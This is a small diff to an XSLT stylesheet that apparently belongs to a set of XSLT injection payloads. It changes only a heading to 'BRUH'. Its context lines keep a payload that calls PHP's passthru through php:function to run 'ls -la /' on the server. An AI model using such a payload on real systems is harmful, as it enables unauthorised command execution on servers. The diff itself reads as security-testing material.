@@ -4,7 +4,7 @@
 <xsl:template match="/">
 	<html>
 		<body>
-			<h3>unparsed-entity-uri()</h3>
+			<h3>BRUH</h3>
 			<ul>
 				<li>
 					<xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
